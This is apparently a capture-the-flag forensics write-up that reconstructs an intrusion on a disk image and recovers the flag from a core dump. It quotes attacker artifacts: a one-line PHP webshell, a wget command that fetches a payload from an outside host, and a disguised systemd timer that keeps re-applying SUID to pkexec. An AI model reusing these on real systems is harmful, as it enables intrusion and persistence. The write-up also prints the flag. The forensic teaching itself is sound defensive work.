# Mission Creep

| | |
|---|---|
| **Category** | Lab |
| **Points** | 400 |
| **Solves** | 55 |
| **Flag** | `number{a_foothold_is_never_just_a_foothold}` |

## Description

> `[ FILE REF: S1E3 "MISSION CREEP" // NODE COMPROMISED -- POST-INCIDENT ]`
> It started small. One door left unlocked... A foothold became a habit. A habit became
> a key. A key became the whole house... The machine is offline now. I have its disk.
> Everything they did is still written here, even the parts they tried to erase. Walk
> it forward. Find where they entered, how they stayed, how they became root, and what
> they carried out. The last of those is the flag.
>
> Artifact: `relay-07.img.xz` (1 GB) → 25 GiB raw GPT disk image

> **Note:** the multi-GB disk image is not committed. This writeup documents the full
> intrusion reconstruction and the exact commands used.

## Initial analysis — getting into the image without root

The `.7z` yields `relay-07.img`, a 25 GiB GPT disk. Partition 3 is an LVM PV
(`ubuntu-vg/ubuntu-lv`). With no root (no `guestmount`/`losetup`), the LV is reached by
parsing the LVM text metadata by hand and computing the data offset:

```
PV = partition 3 (start sector 4198400), pe_start = 2048, extent_size = 8192
LV ubuntu-lv segment1 start_extent = 0
LV data starts at sector 4198400 + 2048 = 4200448   (ext4 magic 53ef verified)
```

```bash
fls -o 4200448 relay-07.img                      # browse the ext4 LV
dd if=relay-07.img of=relay-lv.img skip=2100224 ... # carve the LV, then use debugfs
```

## The core concept — reconstruct the full intrusion chain

Timelining (`mactime`) plus the logs tells the story the challenge asks for. There are
two activity windows — "not equal":

- **Window 1 (DECOY, ~Apr 9 2026):** SSH brute-force noise in `auth.log` (all failed) and
  Nmap NSE web scanning in nginx `access.log`. Nothing succeeded.
- **Window 2 (REAL, Apr 13/14 2026):**
  1. **Foothold** — `POST /upload.php` (unvalidated upload) drops a webshell
     `/var/www/html/uploads/sess_4f1c.php` (`system($_GET['c'])`). Attacker
     `203.0.113.7` runs `id`, `uname -a`, `wget http://198.51.100.9/k -O /dev/shm/.k`.
  2. **Persistence** — a systemd timer disguised among legit ones: `cleanup.timer` →
     `cleanup.service` → `/usr/local/sbin/.sysupd` (every 15 min), which re-applies SUID
     to `/usr/bin/pkexec`. A rogue `sysop` user is appended to `/etc/passwd`
     (root's `.viminfo` shows `/etc/passwd` was edited).
  3. **Privesc** — `pkexec` is left SUID-root (mode `rwsr-xr-x`) — PwnKit-style local root.
  4. **Anti-forensics** — `/root/.bash_history` truncated to 0 bytes. "Absence of data is
     evidence."
  5. **Exfil staging** — `/var/tmp/.x/` (mode 700, root).

## Solving it — the flag is in a core dump, not a text file

The staging dir `/var/tmp/.x/` holds `loot.tgz` (an asset dossier) and
`core.exfil.1551` — an **ELF core dump** of the attacker's `./exfil` process. The
README hint: *"strings on text files will not find the flag. Look deeper."* The flag
lives in captured process memory:

```bash
debugfs -R "dump /var/tmp/.x/core.exfil.1551 core.exfil.1551" relay-lv.img
file core.exfil.1551          # ELF 64-bit core file, from './exfil'
strings -a core.exfil.1551 | grep 'number{'
# relay exfil channel auth = number{a_foothold_is_never_just_a_foothold}
```

This is the unique meaningful `number{...}` across the whole LV (other matches are perl
/ documentation noise).

## Flag

```
number{a_foothold_is_never_just_a_foothold}
```

## Key takeaways

- You can forensicate an LVM-on-GPT image **without root**: parse the LVM text metadata,
  compute the LV's byte offset, and drive The Sleuth Kit / `debugfs` at that offset.
- Full intrusion narratives reward timelining: separate the decoy noise window from the
  window where something actually succeeded.
- "Look deeper" = process memory. **Core dumps** capture secrets that never hit disk as
  plaintext — `file` to confirm the ELF core, then `strings`/`gdb` on it.
